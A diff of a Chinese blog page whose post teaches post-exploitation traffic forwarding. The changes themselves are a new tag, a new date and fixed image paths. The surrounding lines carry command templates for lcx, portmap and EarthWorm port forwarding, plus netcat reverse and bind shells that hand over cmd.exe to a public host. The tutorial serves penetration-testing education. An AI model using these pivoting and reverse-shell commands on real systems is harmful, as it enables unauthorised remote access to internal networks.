@@ -429,9 +429,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
+                                <span class="chip bg-color">后渗透之流量转发</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -443,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-31
+                    2021-02-04
                 </div>
                 
 
@@ -466,10 +470,10 @@
             <div id="articleContent">
                 <p>在拿到一台服务器shell的时候，如果想要更进一步渗透测试，则需要进行内网渗透，而内网渗透的第一步就是挂代理，在日常生活中常用<code>vpn</code>挂代理去google查资料，自己搭过<code>vpn</code>的人都知道，要在买的<code>vps</code>上搭建<code>ss的服务器端</code>，之后在<code>自己电脑</code>上下载<code>ss的客户端</code>，确定对应的加密协议和密码就能成功转发，而在内网渗透的流量转发是一个道理，是在拿到shell的服务器上使用工具让它变成代理的服务器端，之后在本机使用客户端工具进行连接；</p>
 <h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p><strong>端口转发草图：</strong></p>
-<img src="F:\gitman-yy\source\medias\后渗透之流量转发\端口转发草图.jpg" style="zoom:80%;" />
+<img src="后渗透之流量转发\端口转发草图.jpg" style="zoom:80%;" />
 
 <h3 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h3><p>lcx.exe是一款windows上端口转发工具；</p>
-<p><img src="F:\gitman-yy\source\medias\后渗透之流量转发\lcx.png" alt="lcx"></p>
+<p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Clcx.png" alt="lcx"></p>
 <h4 id="·反向转发"><a href="#·反向转发" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
 <p>内网主机执行：lcx.exe  -slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p>
 </blockquote>
@@ -484,7 +488,7 @@
 </blockquote>
 <p>验证：任何主机远程连接目标主机的53端口，即可连接到目标主机；</p>
 <h3 id="port-map端口转发"><a href="#port-map端口转发" class="headerlink" title="port map端口转发"></a>port map端口转发</h3><p>portmap是一款linux上端口转发工具</p>
-<p><img src="F:\gitman-yy\source\medias\后渗透之流量转发\portmap.png" alt="portmap"></p>
+<p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Cportmap.png" alt="portmap"></p>
 <h4 id="·反向转发-1"><a href="#·反向转发-1" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
 <p>内网主机执行：./portmap -m 3 -h1 内网主机IP -p1 22 -h2 公网主机IP -p2 6666</p>
 </blockquote>
@@ -496,7 +500,7 @@
 <p>目标主机上执行：./portmap -m 1 -h1 内网主机IP -p1 22  -p2 6666</p>
 </blockquote>
 <p>验证：ssh 内网主机IP 6666，即可连接到内网主机</p>
-<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p><img src="F:\gitman-yy\source\medias\后渗透之流量转发\nc.png" alt="nc"></p>
+<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Cnc.png" alt="nc"></p>
 <h4 id="·反向连接"><a href="#·反向连接" class="headerlink" title="·反向连接"></a>·反向连接</h4><blockquote>
 <p>公网主机监听：nc -lvp 端口</p>
 <p>内网主机执行：nc -t -e cmd.exe 公网主机IP 端口</p>
@@ -507,8 +511,10 @@
 <p>本地主机执行：nc -v 远程主机IP 端口</p>
 </blockquote>
 <p>验证：成功后本地主机即可得到远程主机的cmd shell</p>
-<h1 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h1><h4 id="Termite-是EW（EarthWorm）的最新版，官方链接：-http-rootkiter-com-Termite"><a href="#Termite-是EW（EarthWorm）的最新版，官方链接：-http-rootkiter-com-Termite" class="headerlink" title="Termite 是EW（EarthWorm）的最新版，官方链接： http://rootkiter.com/Termite/"></a>Termite 是EW（EarthWorm）的最新版，官方链接： <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></h4><p>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p>
-<h4 id="EW（EarthWorm）"><a href="#EW（EarthWorm）" class="headerlink" title="EW（EarthWorm）"></a>EW（EarthWorm）</h4><p><img src="F:\gitman-yy\source\medias\后渗透之流量转发\ew.png" alt="ew"></p>
+<h1 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h1><p><strong>Termite 是EW（EarthWorm）的最新版，官方链接： <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></strong></p>
+<p>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p>
+<p><strong>EW（EarthWorm）</strong></p>
+<p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Cew.png" alt="ew"></p>
 <h4 id="·正向端口转发"><a href="#·正向端口转发" class="headerlink" title="·正向端口转发"></a>·正向端口转发</h4><blockquote>
 <p>目标主机执行：ew -s  lcx_tran -l 53 -f 目标主机ip -g 3389</p>
 </blockquote>
@@ -562,7 +568,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gitman-yy.github.io/2021/01/31/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">https://gitman-yy.github.io/2021/01/31/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</a>
+                    <a href="https://gitman-yy.github.io/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">https://gitman-yy.github.io/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -599,7 +605,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
+                                    <span class="chip bg-color">后渗透之流量转发</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -774,7 +784,7 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/01/31/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
+                <a href="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
                     <div class="card-image">
                         
                         
@@ -791,7 +801,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-04
                             </span>
                         <span class="publish-author">
                             
@@ -802,6 +812,14 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
+                        <span class="chip bg-color">后渗透之流量转发</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
